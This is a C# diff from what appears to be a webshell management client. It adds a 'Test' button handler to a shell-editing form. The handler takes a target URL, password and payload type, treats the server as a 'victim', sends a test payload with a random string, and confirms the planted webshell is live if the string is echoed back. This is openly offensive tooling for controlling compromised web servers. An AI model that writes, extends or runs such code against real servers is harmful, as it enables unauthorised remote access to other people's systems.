@@ -35,7 +35,7 @@ namespace Alien
         public frmEditShell(clsSqlite sqlConn, stShellConfig config, bool bNewShell, List<string> lsGroupName)
         {
             InitializeComponent();
-
+            
             m_sqlConn = sqlConn;
             m_stShellConfig = config;
             m_bNewShell = bNewShell;
@@ -110,10 +110,30 @@ namespace Alien
         }
 
         //Test
-        private void button1_Click(object sender, EventArgs e)
+        private async void button1_Click(object sender, EventArgs e)
         {
+            stShellConfig config = new stShellConfig()
+            {
+                szUrl = textBox1.Text,
+                szPassword = textBox2.Text,
+                szEncoding = comboBox5.Text,
+                szMethod = comboBox4.Text,
+                language = (enLanguage)Enum.Parse(typeof(enLanguage), comboBox1.Text),
+                payloadType = (enPayloadType)Enum.Parse(typeof(enPayloadType), comboBox3.Text),
+            };
 
+            clsVictim victim = new clsVictim(m_sqlConn, config, false);
+            clsWeb web = new clsWeb(victim);
+
+            string szPattern = clsEzData.fnszGenerateRandomStr();
+            string szResp = await web.fnszSendPayload("test", new string[] { szPattern });
+
+            if (string.Equals(szPattern, szResp))
+                MessageBox.Show("Congrats! Webshell is valid", "OK!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            else
+                MessageBox.Show("Oops! Webshell or the configuration is invalid...", "Oops!", MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
+
         //Save
         private void button2_Click(object sender, EventArgs e)
         {
